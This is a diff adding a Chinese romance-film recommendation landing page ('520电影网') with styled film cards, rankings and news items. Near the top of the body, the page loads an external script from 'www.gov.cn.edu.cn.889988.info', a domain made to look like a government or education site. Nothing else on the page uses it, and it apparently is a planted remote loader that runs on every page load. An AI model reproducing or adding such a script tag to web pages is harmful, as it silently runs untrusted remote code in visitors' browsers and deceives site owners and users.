@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<title>520电影网 - 一部好片，说给懂的人</title>
+<meta name="keywords" content="520电影网,520dianyingwang,情侣电影,浪漫电影,520表白,爱情片单,约会电影,情人节电影,经典爱情电影">
+<meta name="description" content="520电影网——为爱情与浪漫而生的影视推荐站。精选情侣电影、浪漫爱情片、520表白片单与约会观影指南，一部好片，说给懂的人听。">
+<meta name="author" content="520电影网">
+<meta name="robots" content="index,follow">
+<meta property="og:title" content="520电影网 - 一部好片，说给懂的人">
+<meta property="og:description" content="精选情侣电影、浪漫爱情片、520表白片单与约会观影指南。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://520dianyingwang-wap.github.io">
+<link rel="canonical" href="https://520dianyingwang-wap.github.io">
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+html{scroll-behavior:smooth;}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;
+  background:#fff5f7;color:#4a2c3a;line-height:1.7;overflow-x:hidden;-webkit-font-smoothing:antialiased;
+}
+a{text-decoration:none;color:inherit;}
+ul{list-style:none;}
+img{max-width:100%;display:block;}
+:root{
+  --rose:#e11d74;
+  --pink:#ff6b9d;
+  --light:#ffd9e5;
+  --deep:#a0124d;
+  --ink:#4a2c3a;
+  --muted:#9a7a86;
+  --paper:#fff;
+  --line:#ffe0ea;
+  --radius:20px;
+}
+body::before{
+  content:"";position:fixed;inset:0;z-index:-1;pointer-events:none;
+  background-image:radial-gradient(circle at 12% 18%,rgba(255,107,157,0.10),transparent 42%),
+    radial-gradient(circle at 88% 72%,rgba(225,29,116,0.08),transparent 42%),
+    radial-gradient(circle at 50% 50%,rgba(255,217,229,0.5),transparent 60%);
+}
+/* 漂浮爱心背景 */
+body::after{
+  content:"💗";position:fixed;top:18%;left:8%;font-size:22px;opacity:0.5;z-index:-1;
+  animation:float1 7s ease-in-out infinite;
+}
+@keyframes float1{0%,100%{transform:translateY(0) rotate(-6deg);}50%{transform:translateY(-24px) rotate(6deg);}}
+@keyframes float2{0%,100%{transform:translateY(0) rotate(5deg);}50%{transform:translateY(-18px) rotate(-5deg);}}
+
+/* 头部 */
+.header{position:fixed;top:0;left:0;right:0;z-index:1000;background:rgba(255,255,255,0.88);backdrop-filter:blur(14px);border-bottom:1px solid var(--line);}
+.nav{max-width:1140px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:13px 20px;}
+.logo{display:flex;align-items:center;gap:10px;font-size:21px;font-weight:900;}
+.logo .heart{
+  width:38px;height:38px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:19px;
+  background:linear-gradient(135deg,var(--rose),var(--pink));color:#fff;box-shadow:0 6px 18px rgba(225,29,116,0.3);
+}
+.logo b{color:var(--rose);}
+.logo i{font-style:normal;color:#f43f5e;font-size:23px;}
+.menu-btn{display:none;flex-direction:column;gap:5px;background:none;border:none;cursor:pointer;padding:6px;}
+.menu-btn i{width:24px;height:2.5px;background:linear-gradient(90deg,var(--rose),var(--pink));border-radius:2px;display:block;}
+.nav-links{display:flex;gap:2px;align-items:center;}
+.nav-links a{color:var(--ink);font-size:15px;font-weight:600;padding:9px 15px;border-radius:12px;transition:all .25s;}
+.nav-links a:hover{color:var(--rose);background:var(--light);}
+.nav-cta{background:linear-gradient(135deg,var(--rose),var(--pink)) !important;color:#fff !important;box-shadow:0 6px 18px rgba(225,29,116,0.3);}
+.nav-cta:hover{transform:translateY(-2px);filter:brightness(1.06);}
+
+/* Hero */
+.hero{margin-top:66px;padding:80px 20px 70px;position:relative;}
+.hero-inner{max-width:1140px;margin:0 auto;display:grid;grid-template-columns:1.15fr 0.85fr;gap:40px;align-items:center;}
+.hero h1{font-size:54px;font-weight:900;line-height:1.12;color:var(--ink);letter-spacing:-1px;}
+.hero h1 .num{color:var(--rose);position:relative;display:inline-block;}
+.hero h1 .num::after{content:"💕";position:absolute;right:-32px;top:-6px;font-size:26px;animation:pulse 2s ease infinite;}
+@keyframes pulse{0%,100%{transform:scale(1);}50%{transform:scale(1.25);}}
+.hero h1 small{display:block;font-size:30px;color:var(--pink);margin-top:8px;}
+.hero-sub{color:var(--muted);font-size:17px;margin:20px 0 30px;max-width:480px;}
+.hero-actions{display:flex;gap:14px;flex-wrap:wrap;}
+.btn{display:inline-flex;align-items:center;gap:8px;padding:14px 32px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer;transition:all .3s;border:none;}
+.btn-main{background:linear-gradient(135deg,var(--rose),var(--pink));color:#fff;box-shadow:0 10px 26px rgba(225,29,116,0.32);}
+.btn-main:hover{transform:translateY(-3px);box-shadow:0 14px 34px rgba(225,29,116,0.4);}
+.btn-soft{background:var(--light);color:var(--deep);}
+.btn-soft:hover{background:#ffc9db;}
+.hero-floats{position:relative;height:380px;}
+.float-card{
+  position:absolute;border-radius:18px;padding:14px 16px;background:#fff;box-shadow:0 14px 40px rgba(225,29,116,0.14);
+  border:1px solid var(--line);display:flex;align-items:center;gap:12px;animation:bob 5s ease-in-out infinite;
+}
+.float-card .poster{width:42px;height:58px;border-radius:8px;flex-shrink:0;}
+.float-card .info h4{font-size:14px;color:var(--ink);font-weight:800;}
+.float-card .info p{font-size:12px;color:var(--muted);}
+.float-card.fc1{top:0;left:20px;animation-delay:0s;}
+.float-card.fc2{top:100px;right:10px;animation-delay:1.4s;}
+.float-card.fc3{top:200px;left:40px;animation-delay:2.6s;}
+.float-card.fc4{top:300px;right:30px;animation-delay:0.8s;}
+@keyframes bob{0%,100%{transform:translateY(0);}50%{transform:translateY(-14px);}}
+
+/* 通用 */
+.section{max-width:1140px;margin:0 auto;padding:74px 20px;}
+.sec-head{text-align:center;margin-bottom:44px;}
+.sec-kicker{font-size:13px;font-weight:700;color:var(--pink);letter-spacing:3px;}
+.sec-title{font-size:32px;font-weight:900;color:var(--ink);margin:10px 0 10px;}
+.sec-title .hl{color:var(--rose);}
+.sec-desc{color:var(--muted);max-width:560px;margin:0 auto;font-size:15px;}
+
+/* 栏目一：520 必看 */
+.grid4{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;}
+.card{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;transition:all .35s;}
+.card:hover{transform:translateY(-8px);box-shadow:0 20px 44px rgba(225,29,116,0.18);border-color:var(--light);}
+.c-thumb{position:relative;aspect-ratio:3/4;overflow:hidden;}
+.c-thumb .fill{position:absolute;inset:0;transition:transform .5s;}
+.card:hover .c-thumb .fill{transform:scale(1.08);}
+.c-ribbon{position:absolute;top:12px;left:12px;z-index:2;background:linear-gradient(135deg,var(--rose),var(--pink));color:#fff;font-size:12px;font-weight:700;padding:4px 12px;border-radius:30px;}
+.c-love{position:absolute;top:12px;right:12px;z-index:2;width:34px;height:34px;border-radius:50%;background:rgba(255,255,255,0.85);display:flex;align-items:center;justify-content:center;font-size:15px;cursor:pointer;transition:all .25s;}
+.c-love:hover{background:var(--rose);color:#fff;transform:scale(1.15);}
+.c-body{padding:16px;}
+.c-body h3{font-size:16px;font-weight:800;color:var(--ink);margin-bottom:6px;}
+.c-meta{display:flex;gap:8px;font-size:12px;color:var(--rose);font-weight:600;flex-wrap:wrap;}
+.c-foot{display:flex;justify-content:space-between;align-items:center;margin-top:12px;padding-top:12px;border-top:1px solid var(--line);font-size:12px;color:var(--muted);}
+.c-star{color:#f59e0b;font-size:14px;}
+
+/* 栏目二：片单 */
+.mood-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(210px,1fr));gap:18px;}
+.mood{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);padding:26px 20px;text-align:center;transition:all .35s;cursor:pointer;position:relative;overflow:hidden;}
+.mood::after{content:"";position:absolute;bottom:0;left:50%;transform:translateX(-50%);width:0;height:4px;background:linear-gradient(90deg,var(--rose),var(--pink));transition:width .35s;}
+.mood:hover::after{width:100%;}
+.mood:hover{transform:translateY(-6px);box-shadow:0 16px 38px rgba(225,29,116,0.15);}
+.mood .m-ico{font-size:40px;display:block;margin-bottom:12px;}
+.mood h3{font-size:18px;font-weight:800;color:var(--ink);margin-bottom:6px;}
+.mood p{font-size:13px;color:var(--muted);}
+
+/* 栏目三：榜单 */
+.rank-wrap{display:grid;grid-template-columns:1fr 1fr;gap:24px;}
+.rank-box{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);padding:28px;}
+.rank-box h3{font-size:19px;font-weight:900;color:var(--ink);margin-bottom:20px;}
+.rank-item{display:flex;align-items:center;gap:14px;padding:12px 0;border-bottom:1px dashed var(--line);transition:all .2s;}
+.rank-item:last-child{border-bottom:none;}
+.rank-item:hover{padding-left:10px;background:linear-gradient(90deg,var(--light),transparent);border-radius:10px;}
+.rk{font-size:22px;font-weight:900;min-width:30px;color:#f3c8d6;font-style:italic;}
+.rk.top{color:var(--rose);}
+.rk-info h4{font-size:16px;color:var(--ink);font-weight:800;}
+.rk-info p{font-size:13px;color:var(--muted);}
+.r-tag{font-size:11px;background:var(--light);color:var(--deep);padding:3px 10px;border-radius:30px;margin-left:auto;font-weight:700;}
+
+/* 栏目四：观影仪式 */
+.ritual{display:grid;grid-template-columns:repeat(4,1fr);gap:20px;}
+.step{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);padding:28px 22px;text-align:center;transition:all .35s;position:relative;}
+.step:hover{transform:translateY(-6px);box-shadow:0 16px 38px rgba(225,29,116,0.15);border-color:var(--light);}
+.step .s-num{width:46px;height:46px;margin:0 auto 14px;border-radius:50%;background:linear-gradient(135deg,var(--rose),var(--pink));color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;font-weight:900;box-shadow:0 8px 20px rgba(225,29,116,0.3);}
+.step h3{font-size:17px;font-weight:800;color:var(--ink);margin-bottom:8px;}
+.step p{font-size:14px;color:var(--muted);}
+
+/* 栏目五：最新资讯 */
+.news-list{display:grid;grid-template-columns:repeat(2,1fr);gap:20px;}
+.news{background:var(--paper);border:1px solid var(--line);border-radius:var(--radius);overflow:hidden;display:flex;transition:all .35s;}
+.news:hover{transform:translateY(-5px);box-shadow:0 14px 34px rgba(225,29,116,0.14);}
+.n-cover{flex-shrink:0;width:130px;position:relative;}
+.n-cover .fill{position:absolute;inset:0;}
+.n-body{padding:20px;}
+.n-date{font-size:12px;color:var(--rose);font-weight:700;}
+.n-body h3{font-size:16px;font-weight:800;color:var(--ink);margin:6px 0 6px;line-height:1.4;}
+.n-body p{font-size:13px;color:var(--muted);}
+
+/* CTA */
+.cta{max-width:1140px;margin:0 auto 70px;padding:56px 30px;border-radius:28px;background:linear-gradient(135deg,var(--deep),var(--rose),var(--pink));text-align:center;color:#fff;position:relative;overflow:hidden;}
+.cta::before{content:"💘";position:absolute;font-size:140px;opacity:0.12;right:20px;top:-30px;}
+.cta::after{content:"🌹";position:absolute;font-size:120px;opacity:0.1;left:20px;bottom:-30px;}
+.cta h2{font-size:30px;font-weight:900;margin-bottom:12px;}
+.cta p{font-size:16px;opacity:0.95;margin-bottom:26px;}
+.cta-btn{display:inline-block;background:#fff;color:var(--deep);padding:14px 40px;border-radius:30px;font-weight:800;font-size:16px;transition:all .3s;}
+.cta-btn:hover{transform:translateY(-3px) scale(1.05);box-shadow:0 12px 30px rgba(0,0,0,0.2);}
+
+/* 页脚 */
+.footer{background:linear-gradient(135deg,#7a0d3c,#a0124d);color:#ffd9e5;padding:52px 20px 26px;}
+.footer-in{max-width:1140px;margin:0 auto;}
+.foot-top{display:grid;grid-template-columns:1.5fr 1fr 1fr 1fr;gap:30px;padding-bottom:30px;border-bottom:1px solid rgba(255,255,255,0.15);}
+.foot-brand .logo .heart{box-shadow:none;}
+.foot-brand .logo b{color:#fff;}
+.foot-brand p{font-size:14px;margin-top:12px;color:#ffd9e5;}
+.foot-col h4{color:#fff;font-size:16px;font-weight:700;margin-bottom:14px;}
+.foot-col a{display:block;color:#ffd9e5;font-size:14px;padding:5px 0;transition:color .2s;opacity:0.9;}
+.foot-col a:hover{color:#fff;opacity:1;}
+.foot-bot{max-width:1140px;margin:24px auto 0;text-align:center;font-size:13px;color:#ffc9db;line-height:1.9;}
+.foot-bot a{color:#fff;}
+
+/* 返回顶部 */
+.top-btn{position:fixed;bottom:28px;right:28px;z-index:999;width:46px;height:46px;border-radius:50%;background:linear-gradient(135deg,var(--rose),var(--pink));color:#fff;display:flex;align-items:center;justify-content:center;font-size:20px;cursor:pointer;border:none;box-shadow:0 8px 22px rgba(225,29,116,0.35);opacity:0;visibility:hidden;transform:translateY(10px);transition:all .3s;}
+.top-btn.show{opacity:1;visibility:visible;transform:translateY(0);}
+.top-btn:hover{transform:translateY(-3px);}
+
+@media(max-width:900px){
+  .hero-inner{grid-template-columns:1fr;}
+  .hero-floats{display:none;}
+  .grid4{grid-template-columns:repeat(2,1fr);gap:14px;}
+  .rank-wrap,.news-list{grid-template-columns:1fr;gap:18px;}
+  .ritual{grid-template-columns:repeat(2,1fr);}
+  .foot-top{grid-template-columns:1fr 1fr;gap:24px;}
+}
+@media(max-width:768px){
+  .menu-btn{display:flex;}
+  .nav-links{position:fixed;top:66px;left:0;right:0;flex-direction:column;background:#fff;border-bottom:2px solid var(--rose);padding:16px;transform:translateY(-200%);transition:transform .4s;gap:0;}
+  .nav-links.open{transform:translateY(0);}
+  .nav-links a{width:100%;padding:14px;text-align:center;border-bottom:1px solid var(--line);}
+  .hero{padding:48px 16px 42px;}
+  .hero h1{font-size:32px;}
+  .hero h1 small{font-size:20px;}
+  .hero-sub{font-size:15px;}
+  .section{padding:50px 16px;}
+  .sec-title{font-size:24px;}
+  .mood-grid{grid-template-columns:repeat(2,1fr);gap:12px;}
+  .mood{padding:22px 14px;}
+  .ritual{grid-template-columns:1fr 1fr;gap:14px;}
+  .step{padding:22px 16px;}
+  .news{flex-direction:column;}
+  .n-cover{width:100%;height:120px;}
+  .cta{padding:36px 20px;margin:0 16px 48px;}
+  .cta h2{font-size:22px;}
+  .foot-top{grid-template-columns:1fr;gap:20px;}
+  .top-btn{bottom:20px;right:16px;width:42px;height:42px;}
+}
+@media(max-width:400px){
+  .grid4{grid-template-columns:repeat(2,1fr);gap:10px;}
+  .ritual{grid-template-columns:1fr;}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaolu.js"></script>
+
+<header class="header">
+  <nav class="nav">
+    <a href="#" class="logo"><span class="heart">❤</span><b>520</b><i>电影网</i></a>
+    <button class="menu-btn" id="menuBtn" aria-label="菜单"><i></i><i></i><i></i></button>
+    <ul class="nav-links" id="navLinks">
+      <li><a href="#must">520必看</a></li>
+      <li><a href="#mood">心情片单</a></li>
+      <li><a href="#rank">爱情榜单</a></li>
+      <li><a href="#ritual">观影仪式</a></li>
+      <li><a href="#news">影圈动态</a></li>
+      <li><a href="#" class="nav-cta">立即访问</a></li>
+    </ul>
+  </nav>
+</header>
+
+<!-- Hero -->
+<section class="hero">
+  <div class="hero-inner">
+    <div>
+      <h1><span class="num">520</span><small>一部好片，说给懂的人</small></h1>
+      <p class="hero-sub">520电影网为爱情与浪漫而生。精选情侣电影、浪漫爱情片、520 表白片单与约会观影指南，让每一份心动都有好片相伴。</p>
+      <div class="hero-actions">
+        <a href="#must" class="btn btn-main">💕 开始看片</a>
+        <a href="#rank" class="btn btn-soft">🏆 爱情榜单</a>
+      </div>
+    </div>
+    <div class="hero-floats">
+      <div class="float-card fc1"><div class="poster" style="background:linear-gradient(135deg,#e11d74,#ff6b9d);"></div><div class="info"><h4>泰坦尼克号</h4><p>爱情 · 经典</p></div></div>
+      <div class="float-card fc2"><div class="poster" style="background:linear-gradient(135deg,#f43f5e,#f97316);"></div><div class="info"><h4>怦然心动</h4><p>青春 · 纯爱</p></div></div>
+      <div class="float-card fc3"><div class="poster" style="background:linear-gradient(135deg,#a0124d,#e11d74);"></div><div class="info"><h4>爱在黎明破晓前</h4><p>浪漫 · 文艺</p></div></div>
+      <div class="float-card fc4"><div class="poster" style="background:linear-gradient(135deg,#ff6b9d,#f59e0b);"></div><div class="info"><h4>你的名字。</h4><p>动漫 · 奇缘</p></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目一：520必看 -->
+<section class="section" id="must">
+  <div class="sec-head">
+    <div class="sec-kicker">Must Watch</div>
+    <h2 class="sec-title">520 <span class="hl">必看</span>片单</h2>
+    <div class="sec-desc">每一部都值得反复回味，收藏起来慢慢看。</div>
+  </div>
+  <div class="grid4">
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#e11d74,#ff6b9d);"></div><span class="c-ribbon">经典</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>泰坦尼克号</h3><div class="c-meta"><span>爱情</span><span>史诗</span></div><div class="c-foot"><span>1997 · 奥斯卡</span><span class="c-star">★ 9.4</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#f43f5e,#f97316);"></div><span class="c-ribbon">纯爱</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>怦然心动</h3><div class="c-meta"><span>青春</span><span>治愈</span></div><div class="c-foot"><span>2010 · 豆瓣Top</span><span class="c-star">★ 9.1</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#a0124d,#e11d74);"></div><span class="c-ribbon">浪漫</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>爱在黎明破晓前</h3><div class="c-meta"><span>文艺</span><span>旅行</span></div><div class="c-foot"><span>1995 · 三部曲</span><span class="c-star">★ 8.8</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#ff6b9d,#f59e0b);"></div><span class="c-ribbon">奇缘</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>你的名字。</h3><div class="c-meta"><span>动漫</span><span>奇幻</span></div><div class="c-foot"><span>2016 · 新海诚</span><span class="c-star">★ 8.5</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#be185d,#f43f5e);"></div><span class="c-ribbon">催泪</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>情书</h3><div class="c-meta"><span>纯爱</span><span>治愈</span></div><div class="c-foot"><span>1995 · 岩井俊二</span><span class="c-star">★ 8.9</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#f97316,#facc15);"></div><span class="c-ribbon">温暖</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>爱乐之城</h3><div class="c-meta"><span>歌舞</span><span>梦想</span></div><div class="c-foot"><span>2016 · 奥斯卡</span><span class="c-star">★ 8.4</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#db2777,#a855f7);"></div><span class="c-ribbon">高分</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>时空恋旅人</h3><div class="c-meta"><span>奇幻</span><span>温情</span></div><div class="c-foot"><span>2013 · 治愈</span><span class="c-star">★ 8.8</span></div></div>
+    </div>
+    <div class="card">
+      <div class="c-thumb"><div class="fill" style="background:linear-gradient(135deg,#e11d74,#7c3aed);"></div><span class="c-ribbon">经典</span><div class="c-love">♡</div></div>
+      <div class="c-body"><h3>罗马假日</h3><div class="c-meta"><span>爱情</span><span>黑白</span></div><div class="c-foot"><span>1953 · 奥黛丽</span><span class="c-star">★ 9.1</span></div></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目二：心情片单 -->
+<section class="section" id="mood">
+  <div class="sec-head">
+    <div class="sec-kicker">By Mood</div>
+    <h2 class="sec-title">按<span class="hl">心情</span>挑片</h2>
+    <div class="sec-desc">不管今天是什么心情，都有一部片懂你。</div>
+  </div>
+  <div class="mood-grid">
+    <div class="mood"><span class="m-ico">💘</span><h3>初恋心动</h3><p>那些怦然心动的瞬间</p></div>
+    <div class="mood"><span class="m-ico">💒</span><h3>婚礼爱情</h3><p>一生一次的浪漫</p></div>
+    <div class="mood"><span class="m-ico">🌧️</span><h3>雨天治愈</h3><p>窝在被窝里慢慢看</p></div>
+    <div class="mood"><span class="m-ico">🍷</span><h3>约会必刷</h3><p>两个人刚刚好</p></div>
+    <div class="mood"><span class="m-ico">😢</span><h3>催泪告别</h3><p>准备好纸巾再看</p></div>
+    <div class="mood"><span class="m-ico">✨</span><h3>久别重逢</h3><p>兜兜转转还是你</p></div>
+    <div class="mood"><span class="m-ico">🌃</span><h3>深夜独处</h3><p>一个人的温柔时光</p></div>
+    <div class="mood"><span class="m-ico">💐</span><h3>表白助攻</h3><p>看完就勇敢说出口</p></div>
+  </div>
+</section>
+
+<!-- 栏目三：爱情榜单 -->
+<section class="section" id="rank">
+  <div class="sec-head">
+    <div class="sec-kicker">Top Charts</div>
+    <h2 class="sec-title">爱情<span class="hl">榜单</span></h2>
+    <div class="sec-desc">千万影迷共同票选，最适合情侣共赏的好片。</div>
+  </div>
+  <div class="rank-wrap">
+    <div class="rank-box">
+      <h3>💗 情侣共赏榜</h3>
+      <div class="rank-item"><span class="rk top">1</span><div class="rk-info"><h4>泰坦尼克号</h4><p>爱情 · 史诗经典</p></div><span class="r-tag">必看</span></div>
+      <div class="rank-item"><span class="rk top">2</span><div class="rk-info"><h4>怦然心动</h4><p>青春 · 纯爱</p></div><span class="r-tag">治愈</span></div>
+      <div class="rank-item"><span class="rk top">3</span><div class="rk-info"><h4>爱乐之城</h4><p>歌舞 · 梦想</p></div><span class="r-tag">浪漫</span></div>
+      <div class="rank-item"><span class="rk">4</span><div class="rk-info"><h4>情书</h4><p>纯爱 · 暗恋</p></div><span class="r-tag">催泪</span></div>
+      <div class="rank-item"><span class="rk">5</span><div class="rk-info"><h4>时空恋旅人</h4><p>奇幻 · 温情</p></div><span class="r-tag">温暖</span></div>
+    </div>
+    <div class="rank-box">
+      <h3>💝 520 热搜榜</h3>
+      <div class="rank-item"><span class="rk top">1</span><div class="rk-info"><h4>你的名字。</h4><p>动漫 · 奇幻爱情</p></div><span class="r-tag">飙升</span></div>
+      <div class="rank-item"><span class="rk top">2</span><div class="rk-info"><h4>爱在黎明破晓前</h4><p>文艺 · 浪漫</p></div><span class="r-tag">经典</span></div>
+      <div class="rank-item"><span class="rk top">3</span><div class="rk-info"><h4>花束般的恋爱</h4><p>日影 · 恋爱</p></div><span class="r-tag">热播</span></div>
+      <div class="rank-item"><span class="rk">4</span><div class="rk-info"><h4>一天</h4><p>爱情 · 剧情</p></div><span class="r-tag">推荐</span></div>
+      <div class="rank-item"><span class="rk">5</span><div class="rk-info"><h4>侧耳倾听</h4><p>动漫 · 青春</p></div><span class="r-tag">治愈</span></div>
+    </div>
+  </div>
+</section>
+
+<!-- 栏目四：观影仪式 -->
+<section class="section" id="ritual">
+  <div class="sec-head">
+    <div class="sec-kicker">Ritual</div>
+    <h2 class="sec-title">520 <span class="hl">观影仪式</span></h2>
+    <div class="sec-desc">看片不止于看，更是一场属于两个人的仪式。</div>
+  </div>
+  <div class="ritual">
+    <div class="step"><div class="s-num">1</div><h3>选好片</h3><p>从片单挑一部彼此都想看的电影。</p></div>
+    <div class="step"><div class="s-num">2</div><h3>备零食</h3><p>爆米花、奶茶、小甜品，气氛拉满。</p></div>
+    <div class="step"><div class="s-num">3</div><h3>关灯光</h3><p>调暗灯光，打开投影或投屏大屏。</p></div>
+    <div class="step"><div class="s-num">4</div><h3>留回忆</h3><p>看完聊聊天，把这一刻记下来。</p></div>
+  </div>
+</section>
+
+<!-- 栏目五：影圈动态 -->
+<section class="section" id="news">
+  <div class="sec-head">
+    <div class="sec-kicker">News</div>
+    <h2 class="sec-title">影圈<span class="hl">动态</span></h2>
+    <div class="sec-desc">最新爱情片资讯，第一时间在这里遇见。</div>
+  </div>
+  <div class="news-list">
+    <div class="news">
+      <div class="n-cover"><div class="fill" style="background:linear-gradient(135deg,#e11d74,#ff6b9d);"></div></div>
+      <div class="n-body"><div class="n-date">10月28日</div><h3>520 主题爱情片单正式上线</h3><p>精选 30 部高分爱情片，陪你度过每一个心动时刻。</p></div>
+    </div>
+    <div class="news">
+      <div class="n-cover"><div class="fill" style="background:linear-gradient(135deg,#f43f5e,#f97316);"></div></div>
+      <div class="n-body"><div class="n-date">10月24日</div><h3>《怦然心动》重映定档情人节</h3><p>青春纯爱经典回归大银幕，重温第一次心动。</p></div>
+    </div>
+    <div class="news">
+      <div class="n-cover"><div class="fill" style="background:linear-gradient(135deg,#a0124d,#e11d74);"></div></div>
+      <div class="n-body"><div class="n-date">10月20日</div><h3>日本纯爱电影周启动</h3><p>岩井俊二、新海诚经典作品限时专题展映。</p></div>
+    </div>
+    <div class="news">
+      <div class="n-cover"><div class="fill" style="background:linear-gradient(135deg,#ff6b9d,#f59e0b);"></div></div>
+      <div class="n-body"><div class="n-date">10月15日</div><h3>情侣观影打卡活动开启</h3><p>分享观影合影赢取限定周边与院线观影券。</p></div>
+    </div>
+  </div>
+</section>
+
+<!-- CTA -->
+<section class="cta">
+  <h2>💗 这个 520，和最爱的人一起看部好片</h2>
+  <p>520电影网 —— 一部好片，说给懂的人</p>
+  <a href="#" class="cta-btn">免费探索全部片单 →</a>
+</section>
+
+<!-- 页脚 -->
+<footer class="footer">
+  <div class="footer-in">
+    <div class="foot-top">
+      <div class="foot-brand">
+        <a href="#" class="logo"><span class="heart">❤</span><b>520</b><i>电影网</i></a>
+        <p>一部好片，说给懂的人。520电影网为爱情与浪漫而生，精选情侣电影与浪漫片单。</p>
+      </div>
+      <div class="foot-col">
+        <h4>片单分类</h4>
+        <a href="#">情侣电影</a><a href="#">浪漫爱情</a><a href="#">青春纯爱</a><a href="#">催泪告别</a>
+      </div>
+      <div class="foot-col">
+        <h4>精选栏目</h4>
+        <a href="#must">520必看</a><a href="#rank">爱情榜单</a><a href="#ritual">观影仪式</a><a href="#news">影圈动态</a>
+      </div>
+      <div class="foot-col">
+        <h4>关于本站</h4>
+        <a href="#">网站简介</a><a href="#">联系我们</a><a href="#">版权声明</a><a href="#">免责声明</a>
+      </div>
+    </div>
+  </div>
+  <div class="foot-bot">
+    <p>© 2026 520电影网 520DianYingWang 版权所有</p>
+    <p>网站地址：<a href="https://520dianyingwang-wap.github.io">https://520dianyingwang-wap.github.io</a></p>
+    <p>本站仅供影视文化交流与推荐，不代表任何播放平台 · 如发现侵权请联系我们删除</p>
+  </div>
+</footer>
+
+<button class="top-btn" id="topBtn" aria-label="返回顶部">↑</button>
+
+<script>
+var menuBtn=document.getElementById('menuBtn');
+var navLinks=document.getElementById('navLinks');
+menuBtn.addEventListener('click',function(){navLinks.classList.toggle('open');});
+navLinks.querySelectorAll('a').forEach(function(a){
+  a.addEventListener('click',function(){navLinks.classList.remove('open');});
+});
+var topBtn=document.getElementById('topBtn');
+window.addEventListener('scroll',function(){
+  if(window.scrollY>300){topBtn.classList.add('show');}else{topBtn.classList.remove('show');}
+});
+topBtn.addEventListener('click',function(){window.scrollTo({top:0,behavior:'smooth'});});
+</script>
+
+</body>
+</html>
